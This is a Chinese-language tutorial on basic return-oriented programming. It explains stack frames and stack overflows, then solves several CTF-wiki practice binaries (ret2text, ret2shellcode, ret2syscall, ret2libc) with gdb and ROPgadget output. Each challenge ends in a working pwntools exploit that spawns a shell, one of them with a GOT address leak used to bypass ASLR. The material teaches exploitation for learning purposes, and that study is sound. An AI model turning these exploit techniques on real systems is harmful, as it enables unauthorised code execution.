# Basic ROP


</br>

# 栈帧
函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。

函数状态主要涉及三个寄存器－－esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。

## 调用栈

下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。

- 首先将被调用函数（callee）的参数按照逆序（cdecl）依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。

- 然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。

- 再将当前的ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp被更新为被调用函数（callee）的基地址。

- 在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。

![](/BasicROP.assets/栈分步图.png)



## 恢复栈 

下面就是要恢复上一个函数的状态了，变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。

- 首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。

- 然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。

- 再将返回地址从栈内弹出，并存到 eip 寄存器内。这样调用函数（caller）的 eip（指令）信息得以恢复。

至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。

**以上内容转载于长亭的[手把手教你栈溢出从入门到放弃](https://zhuanlan.zhihu.com/p/25816426)**
<br/>

##  函数调用过程
由上面的步骤解析，可以得到一个比较经典的函数调用过程为：

1. 开辟栈帧（push ebp(当前栈基址压栈)、mov ebp,esp(bp寄存器保存栈顶sp寄存器值)、sub esp,xx(开辟xx大小的栈空间）
2. 保存现场（寄存器的值压入栈中以保存数据）
3. 被调用函数的参数压栈（根据函数调用约定来决定压栈的参数顺序）
4. 调用者函数call被调用者函数（call指令会将下一个指令地址当作返回地址压栈，然后jmp到被调用者函数的地址）
5. 被调用函数保存调用者的栈底地址，然后再保存被调用者栈顶地址
6. 在被调用函数栈帧中，从ebp的位置开始存放局部变量和临时变量
7. 执行对应被调用函数功能
8. 执行完被调用函数后，将局部变量弹出栈外，然后恢复ESP，再将EBP弹出（leave等价于mov esp,ebp ; pop ebp）
9. 最后执行ret（等价于pop eip），恢复上个函数的状态

函数调用栈如图：

![](/BasicROP.assets/栈帧.png)

需要注意的是，32 位和 64 位程序传参不一样：

**x86**
- 函数参数在函数返回地址的上方

**x64**
- System V AMD64 ABI (Linux、FreeBSD、macOS 等采用)中前六个整型或指针参数依次保存在RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。
- 内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。

<br/>

# 栈溢出

## 栈溢出原理
栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是
- 程序必须向栈上写入数据
- 写入的数据大小没有被良好地控制

## 危险函数
- 输入
 - gets，直接读取一行，忽略'\x00'
 - scanf
 - vscanf

- 输出
 - sprintf

- 字符串
 - strcpy，字符串复制，遇到'\x00'停止
 - strcat，字符串拼接，遇到'\x00'停止
 - bcopy
 - read

## 填充长度
计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式
- 相对于栈基地址的的索引，可以直接通过查看EBP相对偏移获得
- 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。
- 直接地址索引，就相当于直接给定了地址。

一般来说，我们会有如下的覆盖需求

- 覆盖函数返回地址，这时候就是直接看 EBP 即可。
- 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。
- 覆盖 bss 段某个变量的内容。
- 根据现实执行情况，覆盖特定的变量或地址的内容。

之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。

**以上来源于[WIKI](https://wiki.x10sec.org/pwn/stackoverflow/stackoverflow_basic/)**

<br/>

# 基本ROP

## ret2text
ret2text 即控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是 gadgets)，这就是我们所要说的ROP。

以下面为例，[题目地址](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text)
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void secure(void)
{
    int secretcode, input;
    srand(time(NULL));

    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        system("/bin/sh");
}

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf("There is something amazing here, do you know anything?\n");
    gets(buf);
    printf("Maybe I will tell you next time !");

    return 0;
}
```
查看保护机制，开启了NX，其他均关闭
```bash
gnq@virtual-machine:~/pwn$ checksec ret2text
[*] '/home/gnq/pwn/ret2text'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
用IDA打开，在main函数F5反编译，可以看到存在gets函数，存在栈溢出漏洞
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets(&s);
  printf("Maybe I will tell you next time !");
  return 0;
}
```
在程序中的secure函数中存在system("/bin/sh")的代码
```c
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641                 call    _system
```
因为gets函数是以回车为结束符，只要不回车就可以不断输入字符，导致栈溢出，从而覆盖掉返回地址，从而控制程序流程，把返回地址设置成0x0804863A，那么系统就会执行system("/bin/sh")，从而getshell

![](/BasicROP.assets/ret2text.png)

下面就是确定填充长度了，用gdb调试程序，生成200个字符，
```bash
gdb ret2text #启动gdb
...
pwndbg> cyclic 200 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```
运行程序之后输入造成程序崩溃，gdb报错是因为返回地址被我们填充的字符覆盖掉，导致程序无法正常跳转
```bash
pwndbg> r #运行
Starting program: /home/gnq/exam/ret2text 
There is something amazing here, do you know anything?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Maybe I will tell you next time !
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
```
查看输出位置到报错位置的距离，得到112（0x6c+0x4），那么我们就需要填充112个无用字符才可以溢出到返回地址
```bash
pwndbg> cyclic -l 0x62616164
112
```
编写攻击脚本
```python
from pwn import *

p=process("./ret2text")
sys_sh_addr=0x804863A

payload='a'*112 + p32(sys_sh_addr) #padding+ret_addr
p.sendline(payload)

p.interactive()
```


## ret2shellcode
ret2shellcode，即控制程序执行 shellcode代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。这需要我们将一段shellcode填充到有可执行权限的区域，如栈上或者bss段，并且把返回地址指向shellcode的起始位置。

以下面为例，[题目地址](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example)
```c
#include <stdio.h>
#include <string.h>

char buf2[100];

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf("No system for you this time !!!\n");
    gets(buf);
    strncpy(buf2, buf, 100);
    printf("bye bye ~");

    return 0;
}
```
查看保护机制，几乎没有开启保护，而且还有可读可写可执行的段存在
```bash
gnq@gnq:~/exam$ checksec ret2shellcode
[*] '/home/gnq/exam/ret2shellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
用IDA打开，F5反汇编得到
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets((char *)&v4);
  strncpy(buf2, (const char *)&v4, 0x64u);
  printf("bye bye ~");
  return 0;
}
```
同样是gets函数存在栈溢出漏洞，可以看到strncpy将v4的内容复制到buf2
```c
.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o
```
通过IDA可以看到buf2在bss段上，地址为0804A080
```bash
gnq@gnq:~/test$ gdb ret2shellcode
...
pwndbg> b main
...
pwndbg> r
...
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /home/gnq/exam/ret2shellcode
 0x8049000  0x804a000 r-xp     1000 0      /home/gnq/exam/ret2shellcode
 0x804a000  0x804b000 rwxp     1000 1000   /home/gnq/exam/ret2shellcode #buf2
0xf7e02000 0xf7e03000 rwxp     1000 0      
0xf7e03000 0xf7fb3000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so
0xf7fb3000 0xf7fb4000 ---p     1000 1b0000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fb4000 0xf7fb6000 r-xp     2000 1b0000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fb6000 0xf7fb7000 rwxp     1000 1b2000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fb7000 0xf7fba000 rwxp     3000 0      
0xf7fd3000 0xf7fd4000 rwxp     1000 0      
0xf7fd4000 0xf7fd7000 r--p     3000 0      [vvar]
0xf7fd7000 0xf7fd9000 r-xp     2000 0      [vdso]
0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r-xp     1000 22000  /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rwxp     1000 23000  /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rwxp    21000 0      [stack]
```
通过vmmap可以看到bss段刚好有可执行权限，那么就可以将shellcode写入buf2中，然后通过栈溢出漏洞控制返回地址到buf2来执行shellcode

![](/BasicROP.assets/ret2shellcode.png)

编写攻击脚本
```python
#!coding:utf-8
from pwn import *

p=process('./ret2shellcode')
buf2=0x0804A080
shellcode=asm(shellcraft.i386.sh())#pwntools生成的32位shellcode

payload=shellcode+"a"*(112-len(shellcode))+p32(buf2) #shellcode+padding + ret_addr
p.sendline(payload)

p.interactive()
```

## ret2syscall
ret2syscall，即控制程序执行系统调用，获取 shell。

在用户空间和内核空间之间，有一个叫做Syscall(系统调用)的中间层，是连接用户态和内核态的桥梁。这样即提高了内核的安全型，也便于移植，只需实现同一套接口即可。Linux系统，用户空间通过向内核空间发出Syscall，产生软中断，从而让程序陷入内核态，执行相应的操作。

应用程序调用系统调用的过程：
- 把系统调用号存入 eax
- 把函数参数存入其它通用寄存器
- 触发 0x80 号中断（ int 0x80 ）

[题目地址](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall)
```c
#include <stdio.h>
#include <stdlib.h>

char *shell = "/bin/sh";

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);
    
    char buf[100];

    printf("This time, no system() and NO SHELLCODE!!!\n");
    printf("What do you plan to do?\n");
    gets(buf);

    return 0;
}
```
查看保护机制，只开启了NX
```bash
gnq@gnq:~/test$ checksec rop 
[*] '/home/gnq/test/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
用IDA查看程序。gets存在栈溢出，但是程序没有后门函数可以直接调用，NX保护也导致shellcode无法使用。
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```
这里使用程序中的gadgets来getshell，其本质是利用系统调用。需要先把对应的系统调用号参数存放到对应的寄存器中，然后再执行int 0x80就可以实现对系统调用。

这题需要利用`execve("/bin/sh",NULL,NULL)`，其系统调用号是11，十六进制为0xb。其他系统调用可以参考[Linux 32位系统调用表](https://syscalls32.paolostivanin.com/)
- 系统调用号，即 eax 应该为 0xb
- 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执 行sh 的地址也可以。
- 第二个参数，即 ecx 应该为 0
- 第三个参数，即 edx 应该为 0

下面就是通过pop把参数存到对应寄存器中，然后用ret再次控制程序的流程，将gadgets串联成payload就可以getshell。

现在可以用ROPgadgets来获取程序中的gadgets，先获取控制eax的gadgets，然后通过一样的方法获取到其他寄存器的gadgets
```bash
gnq@gnq:~/test$ ROPgadget --binary rop --only 'pop|ret' | grep eax
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```
获取程序中/bin/sh的地址
```bash
gnq@gnq:~/test$ ROPgadget --binary rop --string '/bin/sh'
Strings information
============================================================
0x080be408 : /bin/sh
```
获取int 0x80的地址
```bash
gnq@gnq:~/test$ ROPgadget --binary rop --only 'int'
Gadgets information
============================================================
0x08049421 : int 0x80

Unique gadgets found: 1
```
根据系统调用顺序编写攻击脚本
```python
from pwn import *

p=process("./rop")
pop_eax_ret=0x080bb196
pop_edx_ecx_ebx_ret=0x0806eb90
bin_addr=0x080be408
int0x80_addr=0x08049421

payload='a'*112 #padding
payload+=p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bin_addr)
payload+=p32(int0x80_addr)

p.sendline(payload)

p.interactive()
```
对应栈分步图

![](/BasicROP.assets/ret2syscall.png)


## ret2libc
ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。一般情况下，我们会选择执行 system("/bin/sh")，故而此时我们需要知道 system 函数的地址。

### ret2libc1
例题一，[题目地址](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1)
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

char *shell = "/bin/sh";
char buf2[100];

void secure(void)
{
    int secretcode, input;
    srand(time(NULL));

    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        system("shell!?");
}

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf1[100];

    printf("RET2LIBC >_<\n");
    gets(buf1);

    return 0;
}
```
查看保护，开启了NX保护
```bash
gnq@gnq:~/test$ checksec ret2libc1 
[*] '/home/gnq/test/ret2libc1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
用IDA看一下伪代码，依旧是gets函数导致栈溢出
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```
并且该程序的plt表有system函数
```c
.plt:08048460 _system         proc near               ; CODE XREF: secure+44↓p
.plt:08048460                 jmp     ds:off_804A018
.plt:08048460 _system         endp
```
同时程序中也有/bin/sh的地址
```c
rodata:08048720 aBinSh          db '/bin/sh',0          ; DATA XREF: .data:shell↓o
```
那么就可以构造栈帧调用system
![](/BasicROP.assets/ret2libc1.png)

编写攻击脚本
```python
from pwn import *

p=process("./ret2libc1")
sys_plt=0x08048460
bin_addr=0x08048720

payload='a'*112#padding
payload+=p32(sys_plt)+'aaaa'+p32(bin_addr)
p.sendline(payload)

p.interactive()
```

### ret2libc2
例题二，[题目地址](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc2)
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

char buf2[100];

void secure(void)
{
    int secretcode, input;
    srand(time(NULL));

    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        system("no_shell_QQ");
}

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf1[100];

    printf("Something surprise here, but I don't think it will work.\n");
    printf("What do you think ?");
    gets(buf1);

    return 0;
}
```
题目基本内容一致，但是程序中没有 /bin/sh 地址，但是可以在bss段中的buf2写入/bin/sh，然后作为system的参数传入来getshell

![](/BasicROP.assets/ret2libc2.png)

编写攻击脚本
```python
from pwn import *

p=process("./ret2libc2")
pop_ebx_ret=0x0804843d
gets_plt=0x08048460
system_plt=0x8048490
buf2_addr=0x0804A080

payload='a'*112
payload+=p32(gets_plt)+p32(pop_ebx_ret)+p32(buf2_addr)+p32(system_plt)+'aaaa'+p32(buf2_addr)
p.sendline(payload)

p.sendline("/bin/sh")

p.interactive()
```

### ret2libc3
例题二，[题目地址](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3)
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

char buf2[100];

void secure(void)
{
    int secretcode, input;
    srand(time(NULL));

    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        puts("no_shell_QQ");
}

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf1[100];

    printf("No surprise anymore, system disappeard QQ.\n");
    printf("Can you find it !?");
    gets(buf1);

    return 0;
}
```
题目相比之前又少了system函数，多了一个libc.so。保护机制仍是开启了NX
```bash
gnq@gnq:~/test$ checksec ret2libc3 
[*] '/home/gnq/test/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
用IDA看伪代码，依旧是gtes函数导致的栈溢出
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets((char *)&v4);
  return 0;
}
```
程序没有system，需要自己获取system函数的地址。要如何获取system的地址？这里就主要利用了两个知识点
- system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
- 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。

当知道 libc 中某个函数的地址，就可以确定该程序利用的 libc。从而获取 system函数的地址和 /bin/sh 字符串的地址。因为system和/bin/sh都存在于libc中，而libc动态链接库里的函数的偏移是固定的（即`A真实地址-A的偏移地址 = B真实地址-B的偏移地址 = 基地址`），这样就可以通过偏移找到其他想要的函数地址。

如何获取libc中某个函数的地址？一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。由于 libc 的延迟绑定机制，需要泄漏已经执行过的函数的地址。
![](/BasicROP.assets/ret2libc3.png)

编写脚本
```python
#!coding:utf-8
from pwn import *

p=process("./ret2libc3")
elf=ELF("./ret2libc3")
libc=ELF("./libc.so")

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_addr=elf.symbols['_start']

# 泄露puts_got 并控制程序返回到_start，再次执行程序
payload='a'*112
payload+=p32(puts_plt)+p32(main_addr)+p32(puts_got)
p.sendlineafter('Can you find it !?', payload)

# 获取puts_got 
puts_addr=u32(p.recv()[0:4]) 
print("puts_addr: ",hex(puts_addr))

# 计算基址，获取偏移
libc_base = puts_addr-libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_addr = libc_base + libc.search("/bin/sh").next()

# getshell
payload='a'*112
payload+=p32(system_addr)+'aaaa'+p32(bin_addr)

p.sendline(payload)
p.interactive()
```
注：GitHub给的libc.so版本不对，建议去[libc.blukat.me](https://libc.blukat.me/)查询

</br>

## PLT表和GOT表
GOT 全称是全局偏移量表（Global Offset Table），用来存储外部函数在内存的确切地址。GOT 存储在数据段（Data Segment）内，可以在程序运行中被修改。PLT 全称是程序链接表（Procedure Linkage Table），用来存储外部函数的入口点（entry），换言之程序总会到 PLT 这里寻找外部函数的地址。PLT 存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改，所以 PLT 并不会知道程序运行时动态链接库被加载的确切位置。那么 PLT 表内存储的入口点是什么呢？就是 GOT 表中对应条目的地址。

外部函数的内存地址存储在 GOT 而非 PLT 表内，PLT 存储的入口点又指向 GOT 的对应条目，那么程序为什么选择 PLT 而非 GOT 作为调用的入口点呢？在程序启动时确定所有外部函数的内存地址并写入 GOT 表，之后只使用 GOT 表不是更方便吗？这样的设计是为了程序的运行效率。GOT 表的初始值都指向 PLT 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT 表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT 表的初始值，之后再执行函数调用。

![](/BasicROP.assets/plt&got.png)

当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。

![](/BasicROP.assets/plt&got2.png)

**以上来源于[手把手教你栈溢出从入门到放弃](https://zhuanlan.zhihu.com/p/25892385)**

</br>

## 参考
[手把手教你栈溢出从入门到放弃（上）](https://zhuanlan.zhihu.com/p/25816426)

[手把手教你栈溢出从入门到放弃（下）](https://zhuanlan.zhihu.com/p/25892385)

[C语言函数调用栈(一)](https://www.cnblogs.com/clover-toeic/p/3755401.html)

[CTF-WIKI](https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/)



